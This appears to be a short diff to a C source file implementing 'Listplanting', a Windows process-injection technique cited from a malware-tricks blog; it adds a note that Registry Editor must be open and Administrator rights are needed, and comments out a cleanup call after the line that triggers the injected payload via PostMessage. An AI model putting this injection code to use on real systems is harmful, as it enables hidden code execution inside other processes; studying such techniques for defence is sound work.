@@ -3,6 +3,7 @@
 * Resources:
 *	- https://cocomelonc.github.io/malware/2022/11/27/malware-tricks-24.html
 * Notes:
+*	- We need to open Registry Editor before executing the program.
 *	- It requires to run as Administrator.
 * Status: It may no longer work on Windows 11, in my experience.
 */
@@ -74,7 +75,7 @@ BOOL Listplanting() {
 	// Trigger payload.
 	PostMessage(hWndSLV, LVM_SORTITEMS, 0, (LPARAM)lpRemoteBuffer);
 
-	Cleanup(hProcess, lpRemoteBuffer);
+	//Cleanup(hProcess, lpRemoteBuffer);
 
 	return TRUE;
 }
